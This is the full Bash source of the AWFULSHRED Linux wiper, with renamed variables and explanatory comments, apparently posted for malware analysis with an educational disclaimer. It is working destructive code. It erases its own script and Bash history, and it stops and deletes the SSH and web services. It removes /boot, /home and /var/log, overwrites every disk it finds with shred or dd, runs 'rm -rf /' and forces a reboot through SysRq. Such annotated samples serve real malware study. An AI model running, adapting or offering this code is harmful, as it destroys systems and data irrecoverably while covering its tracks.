#!/bin/bash

# ------------------------------------------------------------------------
#
# Beautified AWFULSHRED
#
# This is a beautified and commented version of the the AWFULSHRED Linux
# wiper, with hash:
#
# bcdf0bd8142a4828c61e775686c9892d89893ed0f5093bdc70bde3e48d04ab99
#
# The original sample is a Bash script of 422 lines. It is attributed to
# the Sandworm group and, according to ESET's Industroyer2 report (see
# references below), was used against an Ukrainian energy provider in
# April 2022.
#
# The original sample is mildly obfuscated by replacing some literals,
# variables and function names by short random strings. In the beautified
# version, variables and functions names have been renamed to improve code
# readability.
#
# DISCLAIMER:
#
# This program and its source files are only uploaded for educational
# purposes. DO NOT EXECUTE this program on your personal computer or in
# any other machine if you do not understand what it does and what the
# risks are.
#
# References:
#  * https://www.welivesecurity.com/2022/04/12/industroyer2-industroyer-reloaded/
#  * https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/overview-of-the-cyber-weapons-used-in-the-ukraine-russia-war/
#
# ------------------------------------------------------------------------


declare wipecmd=                                # wiping command to be used (shred or dd)
declare wipeargs=                               # arguments for wipecmd
declare -a disk_list                            # list of disks to be wiped
declare -a systemd_dirs=(                       # list of systemd directories. Used to search for
                    "/etc/systemd/system"       #     and kill some running services (apache, http
                    "/lib/systemd/system"       #     and ssh)
                    "/usr/lib/systemd/system"
                )
declare bash_hist_file=~/.bash_history          # Bash history file

#
# Select command used for wiping. Uses shred if availabe or dd otherwise.
# Returns 1 if none of them is available.
#
function select_wiping_command()
{
        local retval=0

        if command -v shred &> /dev/null; then
                wipecmd="shred"
                wipeargs="-n 1 -x -z "  # n=1 iterations (interesting, less than the default 3)
                                        # -x doesn't round file sizes up to the next full block
                                        # -z add a final overwrite with zeros to hide shredding 
        elif command -v dd &> /dev/null; then
                wipecmd="dd"
                wipeargs="bs=1k if=/dev/urandom of="    # reads and writes 1k bytes at a time
                                                        # input is random bytes
        else
                retval=1
        fi


        return $retval
}

#
# Checks if the file which name is passed as first argument exists.
# Returns 0 if it exists and 1 otherwise.
#
function test_file_exists()
{
        if [ -e $1 ]; then # true if $1 exists regardless of its type
                return 0
        else
                return 1
        fi
}

#
# Wipes the wiper using first shred and then rm.
# [Note 1: What if shred is unavailable?]
# [Note 2: Always succeeds (ret value 0)]
#
function destroy_wiper()
{
        local retval=0


        if test_file_exists "$0"; then
                $(eval "shred -n 1 -x -z $0 >/dev/null 2>&1")
                rm $0 >/dev/null 2>&1
        fi

        return $retval
}

#
# Check that the commands 'dd', 'uname', and 'sed' are available
#
function check_cmds_exist()
{
        local retval=0
        local i

        for i in "dd uname sed"; do
                if ! type "$i" >/dev/null 2>&1; then
                        retval=1
                        break
                fi
        done

        return $retval
}

#
# Stops and disables the service passed as argument, deletes (rm) the associated files, and relaunches systemd.
#
function stop_and_disable_service()
{
        local service_name="${1}.service"       # service name passed as first argument
        local dir
        local full_file_name


        if systemctl --quiet is-active $service_name >/dev/null 2>&1; then      # if the service name is active (currently running)

                systemctl stop $service_name >/dev/null 2>&1                    # stop it
                chkconfig off $service_name >/dev/null 2>&1                     # disable it at boot (using chkconfig)
                systemctl disable $service_name >/dev/null 2>&1                 # disable it at boot (using systemctl)

                for dir in "${systemd_dirs[@]}"; do                             # search for the service file in the systemd directories

                        full_file_name="${dir}/${service_name}"

                        if test_file_exists "$full_file_name"; then             # if the file exists ...

                                rm $full_file_name >/dev/null 2>&1              # ... remove it
                        fi
                done

                systemctl daemon-reload >/dev/null 2>&1                         # reload the systemd daemon after deleting the service
                systemctl reset-failed >/dev/null 2>&1                          # reset all units (services) with failed status

        fi
}

#
# Stops, disable, and removes (rm) the associated files of all the services provided in the first argument (list)
#
function remove_services()
{
        local retval=0
        local sytemctl_list_output
        local list_of_services_to_kill=$1
        local i
        local service_file
        local service
        local unit
        local rest_of_the_line


        sytemctl_list_output=$(systemctl list-units 2>/dev/null)    # lists all loaded services on the system

        for i in ${list_of_services_to_kill}; do

                while read -r unit rest_of_the_line; do    # read an entry. -r to prevent backslash escapes from being interpreted

                        if [[ "$unit" == *"$i"* ]]; then

                                service_name=$(basename -s .service $unit 2>/dev/null) # get service basename, striping the .service suffix

                                if systemctl is-active --quiet $service_name 2>/dev/null; then  # if the service is running ...

                                        stop_and_disable_service "$service_name"                          # delete it

                                        service_file=$(command -v $service_name 2>/dev/null)    # get service file path and name
                                        rm $service_file 2>/dev/null                            # delete file
                                        pkill $service_name 2>/dev/null                         # kill service
                                fi
                        fi

                done <<< "$sytemctl_list_output"
        done


        return $retval
}

#
# Deletes (rm) all directories in the list provided as first argument
#
function delete_directories()
{
        local dir_list=$1
        local f

        for f in ${dir_list}; do
                if [ -d "$f" ]; then
                        rm -rf $f --no-preserve-root >/dev/null 2>&1    # note the --no-preserve-root flag
                fi
        done
}

#
# Wipe disks in disk_list using the preferred wiping command
#
function wipe_disks()
{
        local retval=0
        local ev
        local file
        local i=0
        local -a pidlist
        local p


        if [[ "${#disk_list[@]}" -gt 0 ]]; then

                for file in "${disk_list[@]}"; do
                        ev=$(eval "$wipecmd $wipeargs$file 2>/dev/null") &
                        pidlist[${i}]=$!        # get pid of the wiping command just launched
                        ((i++))

                        if [ "$ev" ]; then
                                retval=1
                        fi
                done
                for p in ${pidlist[@]}; do
                        wait $p                 # wait for the wiping command to finish
                done
        fi


        return $retval
}

#
# Find disk devices using two methods: by processing the output of 'lsblk' or by brute force enumerating the set
# {hda, hdb, ..., hdz, sda, sdb, ..., sdz} and checking if the device file exists in /dev
# The lists of disks is stored in the global variable 'disk_list' (array)
#
function find_disks()
{
        local retval=1
        local lsblk_output
        local lsblk_output_clean
        local devname
        local devtype
        local full_devname
        local n



        lsblk_output=$(lsblk --nodeps --noheadings --output NAME,TYPE 2>/dev/null)      # lists block devices.
                                                                                        # no holder devices or slaves, no headings
        if [[ ! -z "$lsblk_output" ]]; then

                lsblk_output_clean=$(echo "$lsblk_output" | sed 's/[[:space:]]\+/ /g')  # remove extra spaces from the list
                                                                                        # this is never used!
                if [ "$lsblk_output_clean" ]; then
                        n=0
                        while read -r devname devtype;                                  # read device name and type
                        do
                                if [ "$devtype" == "disk" ]; then                       # only care about disks
                                        full_devname="/dev/${devname}"
                                        if test_file_exists "$full_devname"; then       # if the device file exists ...
                                                disk_list[$n]=$full_devname             # ... add it to the list
                                                ((n++))
                                                retval=0                                # there's at least one disk
                                        fi
                                fi
                        done <<< "$lsblk_output"                                        # Bug? Should be $lsblk_output_clean?
                fi
        fi

        if [[ $retval -eq 1 ]]; then                                                    # if no disks found in lsblk output

                n=0
                disk_list=()
                for c in h s ; do
                        for devname in ${c}d{a..z}; do                                  # iterate over {hda, ..., hdz, sda, ..., sdz}
                                full_devname="/dev/${devname}"                          # add those that exist
                                if test_file_exists "$full_devname"; then
                                        disk_list[$n]=$full_devname
                                        ((n++))
                                        retval=0
                                fi
                        done

                done
        fi


        return $retval
}

#
# Returns 0 if Bash version (major) is at least 3
#
function check_bash_version()
{
        local retval=1

        if [[ "${BASH_VERSINFO[0]}" -ge "3" ]]; then
                retval=0
        fi

        return $retval
}

#
# Returns 0 if this is a Linux kernel 2.6.27 or higher
#
function check_linux_kernel_version()
{
        local retval=$(false)
        local name_kernel
        local kernel_release
        local kr
        local num_kr

        name_kernel=$(uname -s)
        kernel_release=$(uname --kernel-release)
        kr=(${kernel_release//[.-]/ })                          # remove dots and hyphen from kernel version
        num_kr=$(((kr[0] * 10000) + (kr[1] * 100) + kr[2]))

        if [[ "${name_kernel}" == "Linux" ]]; then

                if [[ ${num_kr} -ge 20627 ]]; then              # kernel ver. >= 2.6.27

                        retval=$(true)
                fi
        fi

        return $retval
}

#
# Reboots the system using the magic SysRq key trick, which sends commands directly to the kernel via
# the filesystem. The magic SysRq is enabled via the kernel compile time option CONFIG_MAGIC_SYSRQ,
# which seems to be enabled on most distributions.
# For additional details, see: https://mjmwired.net/kernel/Documentation/sysrq.txt
#
function magic_reboot()
{

        echo 1 > /proc/sys/kernel/sysrq 2>/dev/null     # activate the magic SysRq key
        echo b > /proc/sysrq-trigger 2>/dev/null        # immediately reboot w/ disk sync or unmounting,
                                                        #     which this guy obviously doesn't mind
}

#
# Clear and disable command history
#
function clear_history()
{
        # Clear the history for the current shell and destroys the .bash_history file
        set -o history
        history -c
        history -w
        set +o history
        cat "/dev/null" > "$bash_hist_file"
        # Set history size to zero and signal in bash_hist_file
        unset bash_hist_file
        bash_hist_file="/dev/null"
        HISTSIZE=0
        HISTFILESIZE=0

}

#
# Clear and disable command history, turn swapping off and sync everything
#
function fix_history_and_swap()
{
        # Turns history logging on
        set -o history
        # Clear the history for the current shell (and overwrite the history file with the new empty list)
        history -c && history -w
        # Turns history logging off
        set +o history
        # Destroy .bash_history file
        if [[ "$bash_hist_file" != "/dev/null" ]]; then

                cat "/dev/null" > ~/.bash_history
        fi
        # Free pagecache, dentries and inodes
        echo 3 > /proc/sys/vm/drop_caches
        # Sync everything by activating and deactivating swap in all devices and then syncing
        swapon -a 2>/dev/null
        sleep 2
        swapoff -a 2>/dev/null
        sync
}

#
# main function
#
function main()
{
        local retval=1

        # Destroy this shell script
        destroy_wiper
        # Delete Bash history, disable history logging, and turn swapping off
        fix_history_and_swap
        # Delete Bash history (again)
        clear_history
        # Run only if root
        if [ $(id -u) = 0 ]; then
                # Check that Bash version is at least 3
                if check_bash_version; then
                        # Check that this is a Linux kernel 2.6.27 or higher
                        if check_linux_kernel_version; then
                                # Check that the commands 'dd', 'uname', and 'sed' are available
                                # (which is too late for 'uname' because it has already been called)
                                if check_cmds_exist; then
                                        # Select 'shred' as preferred wiiping command or else 'dd' if
                                        # 'shred' is unavailable
                                        if select_wiping_command; then
                                                # Disable and delete apache, http and ssh services from systemd
                                                remove_services "apache http ssh"
                                                # Delete /boot, /home, and /var/log with rm
                                                delete_directories "/boot /home /var/log"
                                                # Find disks in the system
                                                find_disks
                                                # If okay and at least one disk found ... 
                                                if [[ $? -eq 0 && "${#disk_list[@]}" -gt 0 ]]; then
                                                        # ... wipe them
                                                        if wipe_disks; then
                                                                # return 0 if everything ok
                                                                # return 2 through 8 for every other case
                                                                retval=0
                                                        else
                                                                retval=8
                                                        fi
                                                else
                                                        retval=7
                                                fi

                                        else
                                                retval=6
                                        fi
                                else
                                        retval=5
                                fi
                        else
                                retval=4
                        fi
                else
                        retval=3
                fi
        else
                retval=2
        fi

        # Removes /
        rm -rf / --no-preserve-root >/dev/null 2>&1

        # Destroy the wiper script (again)
        if ! destroy_wiper; then
                retval=9
        fi

        # Reboot the system using the magic SysRq trick
        magic_reboot

        return $retval
}


main "$@"